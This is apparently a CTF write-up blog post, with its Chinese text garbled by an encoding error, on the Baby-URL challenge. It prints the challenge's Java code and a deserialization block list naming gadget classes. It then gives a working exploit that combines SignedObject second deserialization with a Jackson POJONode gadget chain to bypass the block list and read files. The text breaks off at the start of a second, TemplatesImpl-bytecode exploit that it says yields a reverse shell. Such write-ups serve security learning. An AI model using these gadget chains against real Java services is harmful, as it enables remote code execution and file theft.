    <content type="html"><![CDATA[<p>è¿™æ¬¡æœ¬æ¥æ˜¯æƒ³å­¦ä¹ JacksonåŸç”Ÿé“¾æ‰å¼€å§‹åšè¿™é“é¢˜æ‰“å¤ç°ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°çš„æ˜¯è¿™é“é¢˜çš„ä¸¤ä¸ªåšæ³•è®©æˆ‘å­¦ä¹ åˆ°äº†JacksonåŸç”Ÿé“¾ç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•é»‘åå•æˆ–è€…æ‰“TemplatesImplæ¶æ„å­—èŠ‚ç ã€‚</p><p>å­¦åˆ°å¦‚ä»Šæ›´è§‰å—ç›ŠåŒªæµ…ï¼Œè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å®¡ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211530820.png" alt="image-20240803211530820"></p><p><strong>IndexController.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/hack&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String payload)</span> &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(byteArrayInputStream);<br>            <span class="hljs-type">URLHelper</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (URLHelper)ois.readObject();<br>            System.out.println(o);<br>            System.out.println(o.url);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok!&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/file&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">file</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            file.createNewFile();<br>        &#125;<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        fis.read(bytes);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLHelper.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLHelper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String url;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">visiter</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLHelper</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-built_in">this</span>.url = url;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.visiter != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.visiter.visitUrl(<span class="hljs-built_in">this</span>.url);<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>                file.createNewFile();<br>            &#125;<br><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>            fos.write(result.getBytes());<br>            fos.close();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLVisitor.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLVisiter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLVisiter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">visitUrl</span><span class="hljs-params">(String myurl)</span> &#123;<br>        <span class="hljs-keyword">if</span> (myurl.startsWith(<span class="hljs-string">&quot;file&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file protocol is not allowed&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(myurl);<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(url.openStream()));<br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>                String inputLine;<br>                <span class="hljs-keyword">while</span>((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    sb.append(inputLine);<br>                &#125;<br><br>                in.close();<br>                <span class="hljs-keyword">return</span> sb.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>                <span class="hljs-keyword">return</span> e.toString();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦æ‰“&#x2F;hackè·¯ç”±ååºåˆ—åŒ–è¿›å»ï¼Œ&#x2F;fileå°±æ˜¯ä¸€ä¸ªè¯»æ–‡ä»¶çš„åŠŸèƒ½ã€‚å†çœ‹ä¸¤ä¸ªURLè‡ªå®šä¹‰æ¨¡æ¿ç±»ï¼Œå®ƒä»¬éƒ½ç»§æ‰¿äº†Serializableæ¥å£ã€‚</p><p>URLHelperé‡å†™äº†readObjectæ–¹æ³•ï¼Œå³ä¸ºå…¥å£ç±»ã€‚è°ƒç”¨äº†ä»»æ„ç±»çš„visitUrlæ–¹æ³•ï¼Œå¹¶æŠŠç»“æœå†™è¿›æ–‡ä»¶é‡Œã€‚</p><p>URLVisiteré€šè¿‡æŒ‡å®šurlè®¿é—®å…¶å†…éƒ¨èµ„æºç„¶åè¿”å›ã€‚</p><p>åªä¸è¿‡æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯&#x2F;hackè·¯ç”±çš„ååºåˆ—åŒ–éƒ¨åˆ†ï¼Œå®ƒä½¿ç”¨çš„æ˜¯è‡ªå®šä¹‰çš„è¾“å…¥æµçš„ç±»<code>MyObjectInputStream</code>ã€‚è¿™ä¸ªç±»é‡å†™äº†<code>resolveClass</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠInetAddressã€CCé“¾banäº†ï¼Œç”šè‡³æŠŠä»–è‡ªå·±å†™çš„URLVisitorå’ŒURLHelperç»™banäº†ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¼•å…¥ç¬¬ä¸€ä¸ªåšæ³•ï¼Œåº”è¯¥ä¹Ÿæ˜¯é¢„æœŸè§£ã€‚</p><h3 id="SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"><a href="#SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•" class="headerlink" title="SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"></a>SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•</h3><p><code>SignedObject</code>çš„äºŒæ¬¡ååºåˆ—åŒ–èƒ½å¤Ÿè®©æˆ‘ä»¬æ­£å¸¸ä½¿ç”¨åˆ°é¢˜ç›®æä¾›çš„<code>URLHelper</code>å’Œ<code>URLVister</code>ï¼Œç„¶åæ€è·¯ä¹Ÿå¾ˆæ¸…æ™°ï¼Œå°±æ˜¯æ‰“<code>/hack</code>ååºåˆ—åŒ–ï¼Œfileçš„<code>startWith</code>ç»•è¿‡å¯ä»¥åœ¨å‰é¢åŠ ä¸ªç©ºæ ¼ï¼Œæˆ–è€…å…¨å¤§å†™ç»•è¿‡ã€‚ç¬¬ä¸€æ¬¡è¯»å–ç›®å½•å’Œæ–‡ä»¶åæ‰¾flagï¼ˆæ˜¯çš„ï¼Œfile:&#x2F;&#x2F;å¯ä»¥è¯»ç›®å½•ï¼‰ï¼Œç¬¬äºŒæ¬¡è¯»å–flagã€‚<code>/flie</code>è·¯ç”±å¯ä»¥è¯»å–åˆ°å›æ˜¾å†…å®¹ã€‚</p><p>æ‰€ä»¥Expå‘¼ä¹‹æ¬²å‡ºï¼Œç”¨<code>Jackson</code>åŸç”Ÿé“¾å¥—ä¸Š<code>SignedObject</code>æ‰“äºŒæ¬¡ååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.PrivateKey;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot; file:///flag_eddiemurphy&quot;</span>);<br>        <span class="hljs-comment">//URLHelper urlHelper = new URLHelper(&quot; file:///&quot;);</span><br>        <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br>        setFieldValue(urlHelper, <span class="hljs-string">&quot;visiter&quot;</span>, urlVisiter);<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp, jsonNodes);<br>        System.out.println(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211139099.png" alt="image-20240803211139099"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211143135.png" alt="image-20240803211143135"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211146962.png" alt="image-20240803211146962"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211151783.png" alt="image-20240803211151783"></p><p>ç¬¬äºŒä¸ªæ–¹æ³•æ›´ç¥ï¼Œå› ä¸ºç›´æ¥RCEäº†ã€‚</p><h3 id="TemplatesImplæ¶æ„å­—èŠ‚ç "><a href="#TemplatesImplæ¶æ„å­—èŠ‚ç " class="headerlink" title="TemplatesImplæ¶æ„å­—èŠ‚ç "></a>TemplatesImplæ¶æ„å­—èŠ‚ç </h3><p>è¿™ä¸ªæ–¹æ³•ç”šè‡³ä¸éœ€è¦å®ƒçš„URLHelperå’ŒURLVisiterï¼Œç›´æ¥èƒ½åå¼¹shellã€‚</p><p>æ€è·¯æ¥æºæ˜¯AliyunCTF2023çš„Bypassit1ã€‚</p><p>ä¸å–å…³å­äº†ï¼Œç›´æ¥ä¸Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> 